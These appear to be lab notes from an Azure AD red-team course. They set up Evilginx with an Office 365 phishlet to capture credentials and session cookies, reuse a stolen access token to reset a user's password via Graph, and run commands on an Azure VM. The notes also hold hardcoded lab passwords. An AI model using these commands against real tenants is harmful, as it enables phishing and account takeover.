# Phishing Evilginx2

* We can use Evilginx3 ([https://github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)) for phishing attacks.
* Evilginx acts as a relay/man-in-the-middle between the legit web page and the target user. The user always interacts with the legit website and Evilginx captures usernames, passwords and authentication cookies.
* It uses phishlets that are configuration files for specific target domains. These are YAML files that specify conditions like hosts, filters, structure of authentication cookies and credentials.

```powershell
# Start evilginx3
C:\\AzAD\\Tools\\evilginx-v3.3.0\\evilginx -p C:\\AzAD\\Tools\\evilginx-v3.3.0\\phishlets -developer

# Configure the domain
config domain student43.corp

# Set the IP for the evilginx server 
config ipv4 external 172.16.150.43

# Use the template for Office 365
phishlets hostname o365 student43.corp

# Verify the DNS entries
phishlets get-hosts o365 
```

**Setup DNS**

> username: admin password: admin@123 link: [http://172.16.2.50:5380/](http://172.16.2.50:5380/)

1. Add a zone student43.corp
2. Point the `NS` value to 172.16.2.50
3. Add `A` records for login.

```powershell
phishlets enable o365

lures create o365

lures get-url 0

sessions
```

**Resetting password from the CLI**

1. Press F12 in the browser and click on Network tab. Make sure the ‘Preserver log’ checkbox is checked.
2. Go to Microsoft Entra ID (search in the search bar or use the top left burger menu).
3. In the ‘Filter’ field of network tab in the browser, search for ‘batch’ and copy the access token.
4. Now, connect to the tenant using Mg module with the token of Roy. Run the below command in a new PowerShell session:

```powershell
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
$params = @{
     passwordProfile = @{
         forceChangePasswordNextSignIn = $false
         password = "VM@Contributor@123@321"
     }
 }

Update-MgUser -UserId "VMContributor43@defcorphq.onmicrosoft.com" -BodyParameter $params
Disconnect-MgGraph
```

```powershell
Connect-AzAccount -TenantId 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | fl *
Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | select -ExpandProperty NetworkProfile
Get-AzNetworkInterface -Name jumpvm741
Get-AzPublicIpAddress -Name jumpvm-ip
Invoke-AzVMRunCommand -ScriptPath C:\\AzAD\\Tools\\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'jumpvm' -ResourceGroupName 'Research' –Verbose

$password = ConvertTo-SecureString 'Stud2802Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student2802', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm
```
